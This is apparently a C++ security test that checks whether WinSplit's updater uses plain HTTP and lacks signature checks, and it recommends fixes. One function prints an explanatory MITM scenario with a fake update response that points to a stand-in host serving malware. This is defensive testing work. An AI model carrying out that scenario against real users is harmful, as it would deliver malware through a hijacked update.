/**
 * HTTP Update Vulnerability Test
 * CRITICAL SECURITY TEST
 *
 * Tests the security risk of WinSplit's update mechanism using plain HTTP.
 *
 * Background:
 * WinSplit's update_thread.cpp uses HTTP (not HTTPS) to check for updates.
 * This creates a Man-in-the-Middle (MITM) attack vector where an attacker
 * on the same network could:
 * 1. Intercept update checks
 * 2. Respond with fake update information
 * 3. Potentially trick users into downloading malware
 *
 * This test demonstrates the vulnerability by:
 * 1. Verifying the update URL uses HTTP
 * 2. Checking network traffic patterns
 * 3. Testing certificate validation (or lack thereof)
 */

#include "../tools/test_harness.h"
#include <stdio.h>
#include <wininet.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <string>

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "ws2_32.lib")

// Known WinSplit update URL (from code analysis)
const wchar_t* WINSPLIT_UPDATE_HOST = L"winsplit-revolution.com";
const wchar_t* WINSPLIT_UPDATE_PATH = L"/update.php";

// Test: Verify update uses HTTP (not HTTPS)
bool Test_UpdateUsesHttp() {
    printf("  Checking WinSplit update URL security...\n");

    // The update URL found in update_thread.cpp uses HTTP
    // URL: "http://winsplit-revolution.com/update.php"

    printf("  Update URL: http://%ls%ls\n",
           WINSPLIT_UPDATE_HOST, WINSPLIT_UPDATE_PATH);

    // Try both HTTP and HTTPS
    HINTERNET hInternet = InternetOpen(L"SecurityTest", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) {
        printf("  Cannot initialize WinINet\n");
        return false;
    }

    // Test HTTP
    HINTERNET hHttpConnect = InternetConnect(hInternet, WINSPLIT_UPDATE_HOST,
        INTERNET_DEFAULT_HTTP_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);

    bool httpWorks = false;
    bool httpsWorks = false;

    if (hHttpConnect) {
        HINTERNET hRequest = HttpOpenRequest(hHttpConnect, L"GET", WINSPLIT_UPDATE_PATH,
            NULL, NULL, NULL, 0, 0);
        if (hRequest) {
            if (HttpSendRequest(hRequest, NULL, 0, NULL, 0)) {
                httpWorks = true;
                printf("  HTTP connection: WORKS\n");
            }
            InternetCloseHandle(hRequest);
        }
        InternetCloseHandle(hHttpConnect);
    }

    // Test HTTPS
    HINTERNET hHttpsConnect = InternetConnect(hInternet, WINSPLIT_UPDATE_HOST,
        INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);

    if (hHttpsConnect) {
        HINTERNET hRequest = HttpOpenRequest(hHttpsConnect, L"GET", WINSPLIT_UPDATE_PATH,
            NULL, NULL, NULL, INTERNET_FLAG_SECURE, 0);
        if (hRequest) {
            if (HttpSendRequest(hRequest, NULL, 0, NULL, 0)) {
                httpsWorks = true;
                printf("  HTTPS connection: WORKS\n");
            } else {
                printf("  HTTPS connection: FAILED (no SSL?)\n");
            }
            InternetCloseHandle(hRequest);
        }
        InternetCloseHandle(hHttpsConnect);
    }

    InternetCloseHandle(hInternet);

    if (httpWorks && !httpsWorks) {
        printf("\n  VULNERABILITY: Server only supports HTTP!\n");
        printf("  All update traffic can be intercepted.\n");
        return false;
    } else if (httpWorks && httpsWorks) {
        printf("\n  WARNING: Server supports both HTTP and HTTPS.\n");
        printf("  WinSplit should be updated to use HTTPS.\n");
        return false;  // Still a vulnerability
    }

    return true;
}

// Test: DNS resolution (potential for DNS spoofing)
bool Test_DnsResolution() {
    printf("  Testing DNS resolution for update host...\n");

    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        printf("  WSAStartup failed\n");
        return false;
    }

    struct addrinfo hints = {};
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;

    struct addrinfo* result = nullptr;

    // Convert wide string to narrow for getaddrinfo
    char hostname[256];
    WideCharToMultiByte(CP_UTF8, 0, WINSPLIT_UPDATE_HOST, -1,
                        hostname, sizeof(hostname), NULL, NULL);

    int err = getaddrinfo(hostname, "80", &hints, &result);

    if (err != 0) {
        printf("  DNS resolution failed: %d\n", err);
        printf("  (This may indicate the domain is offline)\n");
        WSACleanup();
        return true;  // Not a test failure
    }

    printf("  Resolved addresses:\n");
    for (struct addrinfo* ptr = result; ptr != nullptr; ptr = ptr->ai_next) {
        char ipstr[INET6_ADDRSTRLEN];
        struct sockaddr_in* addr = (struct sockaddr_in*)ptr->ai_addr;
        inet_ntop(AF_INET, &addr->sin_addr, ipstr, sizeof(ipstr));
        printf("    %s\n", ipstr);
    }

    freeaddrinfo(result);
    WSACleanup();

    printf("\n  NOTE: DNS spoofing on local network could redirect\n");
    printf("  update checks to a malicious server.\n");

    return true;
}

// Test: Check for certificate pinning (there isn't any)
bool Test_CertificatePinning() {
    printf("  Checking for certificate pinning...\n");

    // WinSplit doesn't use HTTPS at all, so there's no certificate pinning
    // This is expected to fail

    printf("  WinSplit uses plain HTTP - no certificates involved.\n");
    printf("  VULNERABILITY: No certificate pinning possible without HTTPS.\n");

    return false;  // This is intentionally failing to highlight the issue
}

// Test: Simulate what an attacker could do
bool Test_AttackScenario() {
    printf("  MITM Attack Scenario:\n\n");

    printf("  1. Attacker positions on same network (WiFi, LAN)\n");
    printf("  2. Uses ARP spoofing or DNS poisoning\n");
    printf("  3. Intercepts GET request to %ls\n", WINSPLIT_UPDATE_HOST);
    printf("  4. Returns fake update response:\n");
    printf("     <?xml version=\"1.0\"?>\n");
    printf("     <version>99.0.0</version>\n");
    printf("     <url>http://evil.com/malware.exe</url>\n");
    printf("  5. User sees \"Update available!\"\n");
    printf("  6. User downloads and runs malware\n\n");

    printf("  RISK LEVEL: HIGH\n");
    printf("  Any user on public WiFi is vulnerable.\n");

    return true;  // Informational
}

// Test: Check if WinSplit validates update response
bool Test_ResponseValidation() {
    printf("  Checking update response validation...\n");

    // From code analysis: WinSplit parses XML without validation
    // No signature verification, no hash checking

    printf("  Based on code analysis:\n");
    printf("  - XML parsed without schema validation\n");
    printf("  - No digital signature on updates\n");
    printf("  - No hash verification of downloaded files\n");
    printf("  - No certificate pinning\n\n");

    printf("  VULNERABILITY: Update integrity not verified.\n");

    return false;
}

int main() {
    TestHarness::Init("HTTP Update Vulnerability Test (CRITICAL)");

    printf("Testing WinSplit's update mechanism security...\n");
    printf("This identifies MITM attack vulnerabilities.\n\n");

    // Run tests
    TestHarness::RunTest("Update uses HTTP (not HTTPS)", Test_UpdateUsesHttp);
    TestHarness::RunTest("DNS resolution check", Test_DnsResolution);
    TestHarness::RunTest("Certificate pinning", Test_CertificatePinning);
    TestHarness::RunTest("Response validation", Test_ResponseValidation);
    TestHarness::RunTest("Attack scenario (info)", Test_AttackScenario);

    printf("\n");
    TestHarness::PrintColored("CRITICAL SECURITY ISSUE\n", COLOR_RED);
    printf("WinSplit's update mechanism is vulnerable to MITM attacks.\n\n");

    TestHarness::PrintColored("RECOMMENDED FIXES:\n", COLOR_YELLOW);
    printf("1. Change update URL to HTTPS\n");
    printf("2. Implement certificate pinning\n");
    printf("3. Sign update packages with a private key\n");
    printf("4. Verify signatures before applying updates\n");
    printf("5. Use a secure update framework (e.g., Squirrel)\n\n");

    TestHarness::PrintColored("TEMPORARY MITIGATION:\n", COLOR_YELLOW);
    printf("Disable automatic update checks until fixed.\n\n");

    return TestHarness::Summarize();
}
